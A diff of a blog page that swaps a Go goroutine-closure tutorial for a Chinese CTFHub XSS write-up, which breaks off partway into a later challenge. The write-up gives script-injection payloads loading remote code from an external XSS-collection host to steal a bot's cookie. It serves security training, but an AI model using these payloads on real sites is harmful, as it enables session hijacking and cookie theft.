@@ -69,7 +69,7 @@
 
 
 
-  <meta name="keywords" content="HandsomeDong,七里翔">
+  <meta name="keywords" content="CTF,Web安全,Writeup,ctfhub,xss,">
 
 
 
@@ -80,13 +80,41 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="HandsomeDong - 七里翔">
-<meta property="og:url" content="http://yoursite.com/page/7/index.html">
+<meta name="description" content="前言跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。 这两天在 CTFHUB 练习了一下 XSS 相关的题">
+<meta name="keywords" content="CTF,Web安全,Writeup,ctfhub,xss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Write up CTFHUB XSS">
+<meta property="og:url" content="http://yoursite.com/2025/08/25/Write-up-CTFHUB-XSS/index.html">
 <meta property="og:site_name" content="HandsomeDong - 七里翔">
+<meta property="og:description" content="前言跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。 这两天在 CTFHUB 练习了一下 XSS 相关的题">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/G6NyFRjczC2Q3ok.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/ADTnZ9BRkfjdsIQ.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/x8y7dG6b5lRUgKC.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/zpDfrniK6OCJbSY.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/VWPcxndMjOIfBeT.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/uvyoR8DnilaOkzg.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/l6ocYap1mFEd3Oy.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/3vwxNIQe59nBqZL.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/oMjCD5ORdyL8HVX.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/tZhc5QbGFzXP7ep.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/Tsa3NhyVUXEwIqF.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/SZpr4iyjUhAc52l.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/SyzjU1q3faMVsXA.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/KSArijzC2D97Rwb.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/gpksGzIy5cNhaf7.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/PDt5siSZjIf2xJu.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/nMUk1JmTc64vrHR.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/BGS3JUYQb16PHir.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/BGS3JUYQb16PHir.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/KCUAboxYHRBtg63.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/KixAnIZ4N7GHBOL.png">
+<meta property="og:image" content="https://s2.loli.net/2025/08/25/jMhbsr2uED7dZ1w.png">
+<meta property="og:updated_time" content="2025-08-25T15:22:41.522Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="HandsomeDong - 七里翔">
+<meta name="twitter:title" content="Write up CTFHUB XSS">
+<meta name="twitter:description" content="前言跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。 这两天在 CTFHUB 练习了一下 XSS 相关的题">
+<meta name="twitter:image" content="https://s2.loli.net/2025/08/25/G6NyFRjczC2Q3ok.png">
 
 
 
@@ -116,13 +144,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/page/7/">
+  <link rel="canonical" href="http://yoursite.com/2025/08/25/Write-up-CTFHUB-XSS/">
 
 
 
 
 
-  <title>HandsomeDong - 七里翔</title>
+  <title>Write up CTFHUB XSS | HandsomeDong - 七里翔</title>
   
 
 
@@ -151,8 +179,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -267,9 +294,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -282,7 +309,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/12/29/Golang大坑之循环goroutine闭包调用/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2025/08/25/Write-up-CTFHUB-XSS/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="HandsomeDong">
@@ -299,9 +326,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2022/12/29/Golang大坑之循环goroutine闭包调用/" itemprop="url">Golang大坑之循环goroutine闭包调用</a></h1>
+          <h1 class="post-title" itemprop="name headline">Write up CTFHUB XSS</h1>
         
 
         <div class="post-meta">
@@ -313,8 +338,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-12-29T23:40:35+08:00">
-                2022-12-29
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2025-08-25T21:36:45+08:00">
+                2025-08-25
               </time>
             
 
@@ -336,8 +361,30 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Golang/" itemprop="url" rel="index">
-                    <span itemprop="name">Golang</span>
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/Web/" itemprop="url" rel="index">
+                    <span itemprop="name">Web</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/Web/Writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">Writeup</span>
                   </a>
                 </span>
 
@@ -354,6 +401,11 @@
           
           
 
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
           
 
           
@@ -373,27 +425,66 @@
       
 
       
-        
-          
-            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>回顾整个2022，突然发现我一篇博客都没写，趁着还没2022还没过去，赶紧<del>水一篇博客</del> 分享一下我最近学习到的一些东西，这次的主题是“Golang大坑之循环goroutine闭包调用”，大家就当小故事来看吧。<br><img src="https://s2.loli.net/2023/07/18/LvX3ADzcOTSGIVE.jpg" alt="躺好，听我讲故事"></p>
-<h1 id="小美又写了bug"><a href="#小美又写了bug" class="headerlink" title="小美又写了bug"></a>小美又写了bug</h1><p>仔细看，这个女孩叫小美，她最近刚入职某Go大厂，从Java转了Go，小美入职仅仅花了半天就学完了Go语法，然后三天写了5个bug，隔三差五就被leader小帅叫到会议室臭骂。<br><img src="https://s2.loli.net/2023/07/18/jbJHKo89QlLeGDF.gif" alt="小美"><br>这不，正当小美写bug写得起劲，小帅又过来拍了拍小美肩膀：“小美，来下会议室”。<br><img src="https://s2.loli.net/2023/07/18/9MyjaQRfYD4btHi.png" alt="小美来下会议室"><br>一来到会议室，小帅直接把笔记本拍到小美脸上：“看看你干的好事。”<br>笔记本上面是小美的提交记录，上面有这么一段代码。</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	nums := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">	<span class="keyword">for</span> _, num := <span class="keyword">range</span> nums &#123;</span><br><span class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">"打工人%d号\n"</span>, num)</span><br><span class="line">		&#125;()</span><br><span class="line">	&#125;</span><br><span class="line">	time.Sleep(time.Microsecond * <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>小美看完表示很委屈：“这有什么毛病吗？这里一共开了十个协程，每个协程打印的编号都不一样，这里的输出应该是下面这样啊？出什么问题了吗？”<br>小美预期的结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">打工人9号</span><br><span class="line">打工人2号</span><br><span class="line">打工人3号</span><br><span class="line">打工人0号</span><br><span class="line">打工人1号</span><br><span class="line">打工人5号</span><br><span class="line">打工人7号</span><br><span class="line">打工人8号</span><br><span class="line">打工人4号</span><br><span class="line">打工人6号</span><br></pre></td></tr></table></figure></p>
-<p>小帅一巴掌甩小美脸上：“要不你看看运行结果？”<br><img src="https://s2.loli.net/2023/07/18/ki8THV2BS59mp3j.png" alt="一巴掌"><br>小美运行了一下，结果让她大吃一斤翔。<br><img src="https://s2.loli.net/2023/07/18/uH72A3kwbyYTBpG.png" alt="运行结果"><br>面对这个结果，坚强的小美也落下了泪，她实在不明白为什么会这样。<br><img src="https://s2.loli.net/2023/07/18/PUwFegCSKybEuOp.jpg" alt="落泪的小美"></p>
-<h1 id="小翔看出问题所在"><a href="#小翔看出问题所在" class="headerlink" title="小翔看出问题所在"></a>小翔看出问题所在</h1><p>谁也没有注意到，此时坐在会议室角落旁的小翔缓缓站了起来：“真相只有一个！”<br><img src="https://s2.loli.net/2023/07/18/9peBGu6UAgKX3tM.png" alt="小翔登场"><br>小翔继续说：“这是Golang新手及其容易犯的一个错误！<strong>你这里的goroutine执行了闭包内的程序，而闭包内直接引用了num变量，这个值并没有被保存到goroutine栈中，这样写会导致for循环结束后才执行goroutine多线程操作，所以你看，很多个协程打印的编号都是9，即for循环结束后协程才运行，这个时候num值其实指向了最后一个元素。当然，有个别协程打印的不是9，因为它们运行得比较早。</strong> 这样写及其容易窜数据，产生严重bug！”</p>
-<p><strong>小帅一巴掌甩小翔脸上：“还TM装逼？快给我修bug。”</strong><br><img src="https://s2.loli.net/2023/07/18/7QXlSIWFbunADCv.jpg" alt="逼都让你装完了"></p>
-<h1 id="小翔的解决方案"><a href="#小翔的解决方案" class="headerlink" title="小翔的解决方案"></a>小翔的解决方案</h1><p>小翔不愧是小翔，是见过各种大场面的男人，只见他不慌不忙给出了几种解决方案。</p>
-<h2 id="正确写法1：不使用闭包"><a href="#正确写法1：不使用闭包" class="headerlink" title="正确写法1：不使用闭包"></a>正确写法1：不使用闭包</h2><p>既然闭包有问题，那我们不使用闭包不就行了？多大点事啊？<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	nums := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">	<span class="keyword">for</span> _, num := <span class="keyword">range</span> nums &#123;</span><br><span class="line">		<span class="keyword">go</span> <span class="built_in">print</span>(num)</span><br><span class="line">	&#125;</span><br><span class="line">	time.Sleep(time.Microsecond * <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">print</span><span class="params">(num <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">"打工人%d号\n"</span>, num)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="正确写法2：循环内定义新变量"><a href="#正确写法2：循环内定义新变量" class="headerlink" title="正确写法2：循环内定义新变量"></a>正确写法2：循环内定义新变量</h2><p>由于循环内定义的变量在循环遍历过程中是不共享的，所以我们可以在循环内再定义新变量。<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	nums := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">	<span class="keyword">for</span> _, num := <span class="keyword">range</span> nums &#123;</span><br><span class="line">		num := num</span><br><span class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">"打工人%d号\n"</span>, num)</span><br><span class="line">		&#125;()</span><br><span class="line">	&#125;</span><br><span class="line">	time.Sleep(time.Microsecond * <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="正确写法3：闭包传参（优雅，推荐）"><a href="#正确写法3：闭包传参（优雅，推荐）" class="headerlink" title="正确写法3：闭包传参（优雅，推荐）"></a>正确写法3：闭包传参（优雅，推荐）</h2><p>使用闭包时，我们还是尽量使用闭包传参，避免直接在闭包内使用外部的变量，比较容易出错。我个人认为这样写起来会比较优雅，推荐这种写法。<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	nums := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">	<span class="keyword">for</span> _, num := <span class="keyword">range</span> nums &#123;</span><br><span class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(num <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">"打工人%d号\n"</span>, num)</span><br><span class="line">		&#125;(num)</span><br><span class="line">	&#125;</span><br><span class="line">	time.Sleep(time.Microsecond * <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>上面3种写法都会得到正确的结果<br><img src="https://s2.loli.net/2023/07/18/Rhwtgy1VmQq65sp.png" alt="运行结果"></p>
-<h1 id="小翔的静态扫描工具"><a href="#小翔的静态扫描工具" class="headerlink" title="小翔的静态扫描工具"></a>小翔的静态扫描工具</h1><h2 id="怎么从根源上避免这个问题"><a href="#怎么从根源上避免这个问题" class="headerlink" title="怎么从根源上避免这个问题"></a>怎么从根源上避免这个问题</h2><p>解决完了这个bug之后，leader小帅的脸色也有所好转，然后问了问小翔：“既然新手都比较容易犯这个错误，那我们有没有什么办法或手段来尽量让后面入职的同学少犯甚至不犯这个错误呢？换句话说，<strong>怎么从根源上避免出现这个问题</strong>？”<br><img src="https://s2.loli.net/2023/07/18/MfEN1ryj9IKbJC4.png" alt="怎么从根源上避免这个问题"><br>小翔推了推眼镜，冷静回答：“这个简单，回头我出个《Golang大坑》系列文档，让入职转Golang的新同学都看一下这个文档，他们就不会犯这个错误了！”<br><img src="https://s2.loli.net/2023/07/19/JxfvHYz5siP8hkA.jpg" alt="小帅推眼镜"><br>小帅直接就是一巴掌：“其实，我对你是有点失望的。你这个职级，不是把事情做完就可以的。你需要有体系化思考的能力。你做的事情，他的价值点在哪里？你是否作出了壁垒，形成了核心竞争力？你做的事情，和公司内其他团队的差异化在哪里？你的事情，是否沉淀了一套可复用的物理资料和方法论？为什么是你来做，其他人不能做吗？你需要有自己的判断力，而不是我说什么你就做什么…………（省略一千字）<strong>你确定你写个文档大家就会去看，就能遵守这一套约定？</strong>”<br><img src="https://s2.loli.net/2023/07/19/fQA2MdKrhJmBYgn.jpg" alt="小帅装逼"></p>
-<h2 id="静态扫描工具"><a href="#静态扫描工具" class="headerlink" title="静态扫描工具"></a>静态扫描工具</h2><p>小翔这次终于是忍不住了，直接甩出了他的终极大招 – 静态扫描工具，缓缓说道：<strong>“这个是我写的Golang静态扫描工具，名叫 </strong>xianggolint<strong>，我刚刚加上了一个新规则：loopgoroutinecheck，它能扫描出循环内goroutine闭包直接引用循环index、value、key的代码，这种代码都是有问题的，Github 链接点<a href="https://github.com/HandsomeDong/xianggolint" target="_blank" rel="noopener">这里</a>，具体的使用方法可以看 readme 文档，以下是测试的扫描结果，可以看到扫描结果显示某个文件的第 12 行代码是有问题的，提示信息非常清晰。如果我们的CI/CD做得比较完善的话，我们还能将这种静态扫描工具接入到上面，在MR的时候进行扫描，扫出问题时就block进程，并提示该问题，这样我们就能在代码合入的阶段防止问题代码合入主分支啦！</strong>”<br><img src="https://s2.loli.net/2023/07/19/n8RsUdqv19WIZ7P.png" alt="代码"><br><img src="https://s2.loli.net/2023/07/19/6wmpHsRQBC1Z4ug.png" alt="代码"><br>小翔此时心里默默说：“今天这个装逼王，我当定了！”<br><img src="https://s2.loli.net/2023/07/19/jkBn7hNmvOAC4ZV.png" alt="小翔装逼王"></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>循环goroutine闭包不能直接使用循环的index、key、value，因为这些变量没有被保存到goroutine栈中，比如以下代码，三个循环内的goroutine都不会得到我们所预期的结果。</strong><br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	nums := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">	<span class="keyword">for</span> index, value := <span class="keyword">range</span> nums &#123;</span><br><span class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">"slice index: %d\n"</span>, index)</span><br><span class="line">			fmt.Printf(<span class="string">"slice value: %d\n"</span>, value)</span><br><span class="line">		&#125;()</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	m := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;<span class="string">"1"</span>: <span class="string">"1"</span>, <span class="string">"2"</span>: <span class="string">"2"</span>, <span class="string">"3"</span>: <span class="string">"3"</span>&#125;</span><br><span class="line">	<span class="keyword">for</span> key, value := <span class="keyword">range</span> m &#123;</span><br><span class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">"map key: %s\n"</span>, key)</span><br><span class="line">			fmt.Printf(<span class="string">"map value: %s\n"</span>, value)</span><br><span class="line">		&#125;()</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">"range i: %d\n"</span>, i)</span><br><span class="line">		&#125;()</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	time.Sleep(time.Microsecond * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p><strong>我写了个静态扫描工具，针对这种代码写了相应的规则，能扫描出问题，欢迎使用，Github地址：<a href="https://github.com/HandsomeDong/xianggolint" target="_blank" rel="noopener">https://github.com/HandsomeDong/xianggolint</a></strong></p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
+<p>这两天在 CTFHUB 练习了一下 XSS 相关的题。</p>
+<p><img src="https://s2.loli.net/2025/08/25/G6NyFRjczC2Q3ok.png" alt="image.png"></p>
+<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>XSS 主要分为 <strong>反射型 XSS</strong> 、<strong>存储型 XSS</strong> 和 <strong>DOM XSS</strong> ，大部分 CTF XSS 最终目的都是获取 Cookie ，也就是需要一个服务端接收脚本发送过来的数据。我们可以借助一些 XSS 平台来实现信息接收，也可以自己实现一个服务暴露到公网中。</p>
+<p>我这里使用 XSS 平台来接收数据，注册及设置过程不过多赘述，平台地址：<a href="https://xssjs.com/" target="_blank" rel="noopener">https://xssjs.com/</a></p>
+<p>在 XSS 平台设置完项目后，即可得到注入的脚本代码，可以看到代码就是会下载并执行 XSS 平台上返回的 JavaScript 代码，那里面的才是真正的恶意代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt sRC=//ujs.ci/2li&gt;&lt;/sCrIpT&gt;  // https://ujs.ci/2li 里面有恶意代码</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2025/08/25/ADTnZ9BRkfjdsIQ.png" alt="2.png"></p>
+<h1 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h1><h2 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h2><p>一打开链接，就能看到两个框。一开始我是一脸懵逼的，看了一下网页代码以及回想了一下 XSS 原理，才大概知道这两个框是什么意思。</p>
+<p>第一个框是真实场景中用户的输入框，我们需要通过这个输入来注入恶意脚本；而第二个框则是为 CTF 服务的，CTF 平台后台会有机器人自动请求第二个输入框中的链接，以模仿真实用户的请求。</p>
+<p>而我们要做的，就是先通过第一个输入来注入恶意脚本，随后在第二个框输入被注入 XSS 攻击的网站链接，以窃取 CTF 平台后台机器人的 Cookie。</p>
+<p><img src="https://s2.loli.net/2025/08/25/x8y7dG6b5lRUgKC.png" alt="1.png"></p>
+<p>随便在第一个框中做了一些注入，分析 HTML 源码发现没做任何过滤，那就直接注入我们的代码吧。</p>
+<p><img src="https://s2.loli.net/2025/08/25/zpDfrniK6OCJbSY.png" alt="3.png"><br><img src="https://s2.loli.net/2025/08/25/VWPcxndMjOIfBeT.png" alt="4.png"></p>
+<p>这很明显是个反射型 XSS ，直接回显 Get 参数里的 name 参数值，把这个链接复制到第二个框中，让机器人请求。</p>
+<p><img src="https://s2.loli.net/2025/08/25/uvyoR8DnilaOkzg.png" alt="5.png"></p>
+<p>来到 XSS 平台的项目后台，可以看到窃取的信息，flag 就在 Cookie 里面。</p>
+<p><img src="https://s2.loli.net/2025/08/25/l6ocYap1mFEd3Oy.png" alt="6.png"></p>
+<h2 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h2><p>解题步骤和上一题完全一样，这里就不过多赘述了。</p>
+<p>不过需要理解存储型 XSS 和反射型 XSS 的区别：</p>
+<p>反射型 XSS 的恶意代码一般出现在网站搜索栏、用户登录口的等地方，恶意代码通常在 URL 中，像上一题的 Get 参数里的 name 参数就是如此，当受害者点击这些专门设计的链接时才会中招。</p>
+<p>而存储型 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码，存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
+<h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h2><p>DOM XSS 是基于 DOM 文档对象模型的一种漏洞，JS 可以通过 DOM 动态检查、修改页面内容。如果用户在客户端输入的数据中注入恶意脚本，而脚本没有被过滤，那就可能受到 DOM XSS 攻击。</p>
+<p>查看代码可以清楚地看到输入的内容是没有经过任何过滤的，会直接插入到页面中。</p>
+<p><img src="https://s2.loli.net/2025/08/25/3vwxNIQe59nBqZL.png" alt="1.png"></p>
+<p><img src="https://s2.loli.net/2025/08/25/oMjCD5ORdyL8HVX.png" alt="2.png"></p>
+<p>但是这次不能直接输入 &#x3C;&#x73;&#x43;&#x52;&#x69;&#x50;&#x74;&#x20;&#x73;&#x52;&#x43;&#x3D;&#x2F;&#x2F;&#x75;&#x6A;&#x73;&#x2E;&#x63;&#x69;&#x2F;&#x32;&#x6C;&#x69;&#x3E;&#x3C;&#x2F;&#x73;&#x43;&#x72;&#x49;&#x70;&#x54;&#x3E; ，直接输入的效果如下。可以看到输入的内容中含有 script 结束标签，导致原本的标签被提前结束了，最终修改页面的脚本执行失败，所以得考虑怎么正确闭合修改页面脚本的 JS 标签才行。</p>
+<p><img src="https://s2.loli.net/2025/08/25/tZhc5QbGFzXP7ep.png" alt="image.png"><br><img src="https://s2.loli.net/2025/08/25/Tsa3NhyVUXEwIqF.png" alt="image.png"></p>
+<p>经过思考，输入的内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;;&lt;/script&gt;&lt;sCRiPt sRC=//ujs.ci/2li&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure></p>
+<p>最终效果如下，先用 &#x27;&#x3B;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E; 把前面那段脚本的标签闭合，这样后面的 &#x3C;&#x73;&#x43;&#x52;&#x69;&#x50;&#x74;&#x20;&#x73;&#x52;&#x43;&#x3D;&#x2F;&#x2F;&#x75;&#x6A;&#x73;&#x2E;&#x63;&#x69;&#x2F;&#x32;&#x6C;&#x69;&#x3E;&#x3C;&#x2F;&#x73;&#x43;&#x72;&#x49;&#x70;&#x54;&#x3E; 就能正常注入到 HTML 中了。</p>
+<p><img src="https://s2.loli.net/2025/08/25/SZpr4iyjUhAc52l.png" alt="image.png"></p>
+<p>把链接输入到第二个框中，查看 XSS 平台后台，从 Cookie 中拿到 flag ！</p>
+<p><img src="https://s2.loli.net/2025/08/25/SyzjU1q3faMVsXA.png" alt="image.png"></p>
+<h2 id="DOM-跳转"><a href="#DOM-跳转" class="headerlink" title="DOM 跳转"></a>DOM 跳转</h2><p>这道题的第一个输入框倒是被锁定了，不允许输入。</p>
+<p><img src="https://s2.loli.net/2025/08/25/KSArijzC2D97Rwb.png" alt="1.png"></p>
